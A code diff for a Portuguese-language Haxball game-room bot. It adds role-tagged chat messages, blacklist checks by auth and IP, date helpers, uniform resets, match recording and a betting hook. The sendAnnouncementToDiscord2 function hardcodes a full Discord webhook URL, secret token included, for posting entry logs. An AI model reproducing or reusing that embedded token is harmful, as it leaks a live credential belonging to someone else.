+            room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${rankTag + vipTag + puskasTag + buskasTag + goldBallTag + garcomTag + luvaOuroTag + chuteiraOuroTag} ${player.admin ? `${config.cargos.dono}` : ''} ${player.name}: ${message}`, p.id, cordochat[player.name] ? '0x' + cordochat[player.name] : (corChat != "" ? '0x' + corChat : 0xE0E0E0), fonte != "" ? fonte : null, 1);
+        } else if (gerentes.includes(authArray[player.id])) {
+            room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${rankTag + vipTag + puskasTag + buskasTag + goldBallTag + garcomTag + luvaOuroTag + chuteiraOuroTag} ${player.admin ? `${config.cargos.gerente}` : ''} ${player.name}: ${message}`, p.id, cordochat[player.name] ? '0x' + cordochat[player.name] : (corChat != "" ? '0x' + corChat : 0xE0E0E0), fonte != "" ? fonte : null, 1);
+        } else if (adminList.includes(authArray[player.id])) {
+            room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${rankTag + vipTag + puskasTag + buskasTag + goldBallTag + garcomTag + luvaOuroTag + chuteiraOuroTag} ${player.admin ? `${config.cargos.administrador}` : ''} ${player.name}: ${message}`, p.id, cordochat[player.name] ? '0x' + cordochat[player.name] : (corChat != "" ? '0x' + corChat : 0xE0E0E0), fonte != "" ? fonte : null, 1);
+        } else if (mods.includes(authArray[player.id])) {
+            room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${rankTag + vipTag + puskasTag + buskasTag + goldBallTag + garcomTag + luvaOuroTag + chuteiraOuroTag} ${player.admin ? `${config.cargos.moderador}` : ''} ${player.name}: ${message}`, p.id, cordochat[player.name] ? '0x' + cordochat[player.name] : (corChat != "" ? '0x' + corChat : 0xE0E0E0), fonte != "" ? fonte : null, 1);
+        } else {
+            room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${rankTag + vipTag + puskasTag + buskasTag + goldBallTag + garcomTag + luvaOuroTag + chuteiraOuroTag} ${player.admin ? `${config.cargos.Admin}` : ''} ${player.name}: ${message}`, p.id, cordochat[player.name] ? '0x' + cordochat[player.name] : (corChat != "" ? '0x' + corChat : 0xE0E0E0), fonte != "" ? fonte : null, 1);
+        }
+    });
 
     return false;
 }
@@ -11049,9 +8091,110 @@ room.onPlayerBallKick = function (player) {
     }
 };
 
+function isBlacklisted(player) {
+    return blacklist.filter(b => b.Auth == player.auth || b.ipv4 == player.ipv4 || b.Conn == player.conn).length > 0;
+}
+
+function getDatehoras() {
+    let data = new Date(),
+        dia = data.getDate().toString().padStart(2, '0'),
+        mes = (data.getMonth() + 1).toString().padStart(2, '0'),
+        horas = data.getHours().toString().padStart(2, '0'),
+        minutos = data.getMinutes().toString().padStart(2, '0');
+    return `${horas}:${minutos}`;
+}
+
+function getDateInfo() {
+    let data = new Date(),
+        dia = data.getDate().toString().padStart(2, '0'),
+        mes = (data.getMonth() + 1).toString().padStart(2, '0'),
+        ano = data.getFullYear(),
+        horas = data.getHours().toString().padStart(2, '0'),
+        minutos = data.getMinutes().toString().padStart(2, '0'),
+        segundos = data.getSeconds().toString().padStart(2, '0');
+
+    return `${dia} do ${mes} de ${ano}, ás ${horas}:${minutos}:${segundos}`;
+}
+
+
+function dataehora() {
+    let data = new Date(),
+        dia = data.getDate().toString().padStart(2, '0'),
+        mes = (data.getMonth() + 1).toString().padStart(2, '0'),
+        ano = data.getFullYear(),
+        horas = data.getHours().toString().padStart(2, '0'),
+        minutos = data.getMinutes().toString().padStart(2, '0');
+    segundos = data.getSeconds().toString().padStart(2, '0');
+    return `${dia}/${mes} de ${ano}, ás ${horas}:${minutos} e ${segundos} segundos`;
+}
+
+
+function sendAnnouncementToDiscord2(message) {
+
+    var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1062134736375533710/zVD9F1Fzol-mjzUYy16pTPMEF-Vf7GsZzST4GexVwTAjMr12XnV9vx5YKTN0yp3-OTaa"); // Webhook Link
+    request.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        avatar_url: '',
+        username: 'Logs Entradas',
+        content: message
+    };
+
+    request.send(JSON.stringify(params));
+}
+
 /* GAME MANAGEMENT */
 
 room.onGameStart = function (byPlayer) {
+    //  if(teamRed.length >= 1){
+    //     modoPosicao = true
+    //   room.pauseGame(true);
+    //   room.sendAnnouncement(`Modo escolha de posições ativado, escolham suas posições!\n!GK, !LD, !LE, !MC, !PD, !PE, !VL`,
+    //     null, errorColor, 'bold', 2);
+    //   let tempoI = 0
+    //   playersJogando = room.getPlayerList().filter((p) => p.team != 0)
+    //   let interval1 = setInterval(() => {
+    //     tempoI++
+    //     let jogadoresFaltamAzul = '';
+    //     let jogadoresFaltamVermelho = '';
+    //     for (player of playersJogando) {
+    //       if (!escolheramPosicao.includes(player.id)) {
+    //         if (player.team === 1) {
+    //           jogadoresFaltamAzul += player.name + ', ';
+    //         } else if (player.team === 2) {
+    //           jogadoresFaltamVermelho += player.name + ', ';
+    //         }
+    //       }
+    //     }
+    //     if (jogadoresFaltamAzul === '' && jogadoresFaltamVermelho === '') {
+    //         room.sendAnnouncement(`O modo escolha de posições foi encerrado.`, null, 0xff69b4, 'bold', 2);
+    //         modoPosicao = false;
+    //         room.pauseGame(false);
+    //         clearInterval(interval1);
+    //         modoPosicao = false;
+    //     } else {
+    //       if (jogadoresFaltamAzul !== '') {
+    //         room.sendAnnouncement(`Time Vermelho, ainda faltam jogadores a escolher (Posições: !GK, !LD, !LE, !MC, !PD, !PE, !VL):\n${jogadoresFaltamAzul}`, null, 0xffffff, 'bold', 2);
+    //       }
+    //     }
+    //     if (tempoI == 6) {
+    //       for (player of playersJogando) {
+    //         if (!escolheramPosicao.includes(player.id)) {
+    //           if (player.team === 1) {
+    //             room.kickPlayer(player.id, 'Não escolheu a posição!', false);
+    //           } else if (player.team === 2) {
+    //             room.kickPlayer(player.id, 'Não escolheu a posição!', false);
+    //           }
+    //           modoPosicao = false;
+    //         }
+    //       }
+    //       room.pauseGame(false);
+    //       clearInterval(interval1);
+    //     }
+    //   }, 5 * 1000);
+    // }
+
     clearTimeout(startTimeout)
     if (byPlayer != null) clearTimeout(stopTimeout);
     game = new Game();
@@ -11063,6 +8206,8 @@ room.onGameStart = function (byPlayer) {
     playSituation = Situation.KICKOFF;
     lastTouches = Array(2).fill(null);
     lastTeamTouched = Team.SPECTATORS;
+    room.sendAnnouncement("[💬] Use !t para conversar com a sua equipe!", null, 0x08FFF7);
+    room.sendAnnouncement("[👕] Use !unis para ver a lista de uniformes!", null, 0x08FFF7);
     teamRedStats = [];
     teamBlueStats = [];
     if (teamRed.length >= teamSize && teamBlue.length >= teamSize) {
@@ -11075,13 +8220,44 @@ room.onGameStart = function (byPlayer) {
 };
 
 room.onGameStop = function (byPlayer) {
+    if (vipTimeoutId) {
+        stopChangeVip(vipTimeoutId);
+    }
+    currentVipValue = 0;
+    room.setTeamColors(1, 60, 0xFFFFFF, [0xFF4D40, 0xFF4D40, 0xFF4D40]); // Cor equipe RED
+    room.setTeamColors(2, 60, 0xFFFFFF, [0x0080ff, 0x0080ff, 0x0080ff]); // Cor equipe BLUE
+    room.sendAnnouncement(`🟢 Uniformes resetados para padrão!`, null, cores.verdeLimao, "bold", 2);
+
+    //  if (!modoPosicao) {
+    //     posicoesPreenchidasRed = {
+    //     GK: false,
+    //     LD: false,
+    //     LE: false,
+    //     VL: false,
+    //     MC: false,
+    //     PD: false,
+    //     PE: false
+    //     };
+    //     posicoesPreenchidasBlue = {
+    //     GK: false,
+    //     LD: false,
+    //     LE: false,
+    //     VL: false,
+    //     MC: false,
+    //     PD: false,
+    //     PE: false
+    //     };
+    //     escolheramPosicao = [];
+    //     room.sendAnnouncement(`As posições foram resetadas.`, null, 0x00FFFF, 'bold', 2);
+    //     }
+
     clearTimeout(stopTimeout);
     clearTimeout(unpauseTimeout);
     for (let player of teamRed) {
         room.setPlayerAvatar(player.id, null)
     }
     if (byPlayer != null) clearTimeout(startTimeout);
-    //game.rec = room.stopRecording();
+    game.rec = room.stopRecording();
     if (
         !cancelGameVariable && game.playerComp[0].length + game.playerComp[1].length > 0 &&
         (
@@ -11216,7 +8392,7 @@ room.onTeamGoal = function (team) {
         for (let player of teamRed) {
             if (vips[authArray[player.id]] && vips[authArray[player.id]].avatarGol[1]) {
                 room.setPlayerAvatar(player.id, vips[authArray[player.id]].avatarGol[1])
-            } if (goalAttribution[0].name == player.name) {
+            } else if (goalAttribution[0].name == player.name) {
                 room.setPlayerAvatar(player.id, '🤡')
             } else {
                 room.setPlayerAvatar(player.id, '😭')
@@ -11261,14 +8437,6 @@ room.onPositionsReset = function () {
 room.onRoomLink = function (url) {
 }
 
-room.onPlayerAdminChange = function (changedPlayer, byPlayer) {
-    updateTeams();
-    if (!changedPlayer.admin && getRole(changedPlayer) >= Role.MASTER) {
-        room.setPlayerAdmin(changedPlayer.id, true);
-        return;
-    }
-    updateAdmins(byPlayer != null && !changedPlayer.admin && changedPlayer.id == byPlayer.id ? changedPlayer.id : 0);
-};
 
 room.onKickRateLimitSet = function (min, rate, burst, byPlayer) {
     if (byPlayer != null) {
@@ -11313,12 +8481,16 @@ room.onGameTick = function () {
     getLastTouchOfTheBall();
     getGameStats();
     handleActivity();
+    controleAposta()
 }
 
 setInterval(() => {
-    room.sendAnnouncement(`Link do nosso discord: ${discord}`,
-        null, announcementColor, 'bold', HaxNotification.CHAT)
-}, 5 * 60 * 1000)
+    room.sendAnnouncement(`Link do nosso discord: ${discord}`, null, announcementColor, 'bold', HaxNotification.CHAT)
+}, 5 * 60 * 1000);
+
+// Interação com alert() ao inicializar
+
+document.title = `${roomName}`;
 
 function globalInit() {
     smp();
